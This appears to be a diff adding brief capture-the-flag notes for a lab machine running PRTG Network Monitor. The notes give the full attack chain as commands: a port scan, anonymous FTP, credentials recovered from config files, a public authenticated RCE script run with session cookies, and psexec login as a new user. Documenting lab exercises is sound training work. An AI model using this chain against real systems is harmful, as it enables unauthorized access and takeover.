@@ -1,0 +1,11 @@
+nmap -T4 -A --top-ports 500 -oN nmap.txt 10.10.10.152
+# anon FTP available
+ftp 10.10.10.152
+# got user flag
+# Administrator folder is restricted
+# foiund netmon config files in ProgramData\Paessler\PRTG Network Monitor
+# logged in as admin prtgadmin / PrTg@dmin2019
+# netmon has authenticated RCE https://github.com/M4LV0/PRTG-Network-Monitor-RCE
+./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=ezM1MUI5RDAyLTdDRTQtNDU3Ri04MTM3LTRFMDA3QTMwQUJCNX0%3D; _gat=1"
+python3 psexec.py pentest:'P3nT3st!'@10.10.10.152
+# got admin flag
